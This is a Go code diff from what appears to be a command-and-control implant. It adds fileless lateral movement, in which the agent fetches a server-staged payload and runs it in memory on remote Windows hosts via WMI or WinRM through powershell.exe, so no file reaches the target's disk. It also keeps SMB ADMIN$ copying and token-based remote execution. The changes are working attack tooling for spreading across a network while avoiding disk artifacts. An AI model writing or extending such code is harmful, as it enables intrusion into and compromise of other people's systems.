@@ -59,18 +59,29 @@ func lateralMove(payload lateralPayload) (string, error) {
 	return lateralMoveWithProgress(payload, nil)
 }
 
-// lateralMoveWithProgress transfers this agent using SMB for WMI, or WSMan
-// for WinRM, and starts it with the requested execution method. Every network
+// lateralMoveWithProgress deploys a fresh agent to the target and starts it
+// with the requested execution method. Loader deployments (the server-sourced
+// *_loader wire methods) stream a staged artifact through the target's
+// powershell.exe and map it in memory, so the deployment works from any
+// source hosting mode and writes no file to the target's disk: legacy wmiexec
+// copies this binary over SMB, the legacy winrm path streams this binary
+// over WSMan, and psexec stages its dedicated service host. Every network
 // operation runs under the pinned worker's thread identity, which carries the
 // active make_token credentials when one is set; without a token the move
 // uses the agent's own identity and requires local admin rights on the
-// target. The WinRM method loads the streamed executable in memory inside
-// the receiver, so the deployment lives only as long as the WinRM shell.
-// All other methods need embedded connection settings (base URL and beacon
+// target. The WinRM loader deployment loads the streamed executable in memory
+// inside the receiver, so it lives only as long as the WinRM shell; the WMI
+// loader deployment creates an independent receiver process. Non-loader WMI
+// and psexec methods need embedded connection settings (base URL and beacon
 // secret) because a service process inherits no operator environment; build
 // them with the server's use_server_config option.
 func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (string, error) {
-	if memoryHosted() {
+	// Guard on the real dependency instead of the hosting mode: loader
+	// deployments stream a server-staged artifact and never touch this
+	// binary, so a memory-hosted source may run them. Every legacy method
+	// still copies or re-executes this binary and keeps refusing from an
+	// in-memory host.
+	if lateralUsesSelfBinary(payload) && memoryHosted() {
 		return "", errMemoryHosted
 	}
 	parent := os.Getenv("RMM_SESSION_ID")
@@ -81,6 +92,7 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 	if targetSession == "" {
 		targetSession = derivedSessionID(parent, "lateral")
 	}
+	deadline := time.Now().Add(time.Duration(payload.TimeoutSeconds * float64(time.Second)))
 
 	if payload.Method == "psexec" {
 		serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
@@ -92,43 +104,88 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 
 	switch payload.Method {
 	case "wmiexec":
-		// Only WMI uses SMB staging. WinRM transfers through its own session.
-		self, err := os.Executable()
-		if err != nil {
-			return "", fmt.Errorf("resolve agent executable: %w", err)
-		}
-		serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
-		if err != nil {
-			return "", err
-		}
-		sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
-		if err := copyFile(self, sharePath); err != nil {
-			return "", fmt.Errorf("stage agent on %s: %w", payload.Host, err)
-		}
-		localPath := `C:\Windows\System32\` + binaryName
-		agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
-		if err := wmiCreateProcess(payload.Host, agentCommand); err != nil {
-			// The staged executable belongs to this deployment only: remove it
-			// instead of leaving an untracked artifact on the target.
-			if rollbackErr := os.Remove(sharePath); rollbackErr != nil && !os.IsNotExist(rollbackErr) {
-				return "", errors.Join(err, fmt.Errorf("rollback staged agent on %s: %w", payload.Host, rollbackErr))
+		if payload.loaderDeploy {
+			// The loader path replaces the ADMIN$ copy: the receiver maps
+			// the streamed artifact in memory, so no deployment file ever
+			// reaches the target's disk.
+			agent, err := lateralLoaderArtifact(payload, deadline)
+			if err != nil {
+				return "", err
 			}
-			return "", err
+			if err := wmiLoaderMove(payload, targetSession, agent, deadline); err != nil {
+				return "", err
+			}
+		} else {
+			// Only legacy WMI uses SMB staging. WinRM and loader
+			// deployments transfer through their own channels.
+			self, err := os.Executable()
+			if err != nil {
+				return "", fmt.Errorf("resolve agent executable: %w", err)
+			}
+			serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
+			if err != nil {
+				return "", err
+			}
+			sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
+			if err := copyFile(self, sharePath); err != nil {
+				return "", fmt.Errorf("stage agent on %s: %w", payload.Host, err)
+			}
+			localPath := `C:\Windows\System32\` + binaryName
+			agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
+			if err := wmiCreateProcess(payload.Host, agentCommand); err != nil {
+				// The staged executable belongs to this deployment only: remove it
+				// instead of leaving an untracked artifact on the target.
+				if rollbackErr := os.Remove(sharePath); rollbackErr != nil && !os.IsNotExist(rollbackErr) {
+					return "", errors.Join(err, fmt.Errorf("rollback staged agent on %s: %w", payload.Host, rollbackErr))
+				}
+				return "", err
+			}
 		}
 	case "winrm":
-		self, err := os.Executable()
-		if err != nil {
-			return "", fmt.Errorf("resolve agent executable: %w", err)
-		}
-		// One transfer-wide deadline bounds the built-in WinRM waits instead
-		// of restarting a full per-operation budget for every packet.
-		deadline := time.Now().Add(time.Duration(payload.TimeoutSeconds * float64(time.Second)))
-		if err := winrmDeployAgent(payload.Host, self, targetSession, payload.WorkspaceID, payload.winrmIdentity, payload.HTTPS, payload.Insecure, deadline); err != nil {
-			return "", err
+		if payload.loaderDeploy {
+			agent, err := lateralLoaderArtifact(payload, deadline)
+			if err != nil {
+				return "", err
+			}
+			if err := winrmDeployLoaderAgent(payload.Host, agent, targetSession, payload.WorkspaceID, payload.winrmIdentity, payload.HTTPS, payload.Insecure, deadline); err != nil {
+				return "", err
+			}
+		} else {
+			self, err := os.Executable()
+			if err != nil {
+				return "", fmt.Errorf("resolve agent executable: %w", err)
+			}
+			if err := winrmDeployAgent(payload.Host, self, targetSession, payload.WorkspaceID, payload.winrmIdentity, payload.HTTPS, payload.Insecure, deadline); err != nil {
+				return "", err
+			}
 		}
 	}
-	return fmt.Sprintf("lateral started: method=%s host=%s target session=%s",
-		payload.Method, payload.Host, targetSession), nil
+	ack := fmt.Sprintf("lateral started: method=%s host=%s target session=%s",
+		payload.Method, payload.Host, targetSession)
+	if payload.loaderDeploy {
+		ack += " loader=" + payload.Loader
+	}
+	return ack, nil
+}
+
+// lateralLoaderArtifact fetches the server-staged deployment artifact for a
+// loader move, bounded by the remaining deployment deadline. The bytes are
+// the server-selected workspace build; this process's own image is never the
+// deployed artifact.
+func lateralLoaderArtifact(payload lateralPayload, deadline time.Time) ([]byte, error) {
+	cfg, err := loadConfig()
+	if err != nil {
+		return nil, fmt.Errorf("load agent configuration for the staged payload: %w", err)
+	}
+	fetchTimeout := time.Until(deadline)
+	if fetchTimeout <= 0 {
+		return nil, errors.New("the deployment deadline expired before fetching the staged payload")
+	}
+	agent, err := lateralStageFetch(cfg, payload.Stage, payload.PayloadSHA256, fetchTimeout)
+	if err != nil {
+		return nil, fmt.Errorf("fetch the staged deployment payload from the server: %w", err)
+	}
+	return agent, nil
 }
 
 // lateralPsexecMove deploys the dedicated lateral service host the way
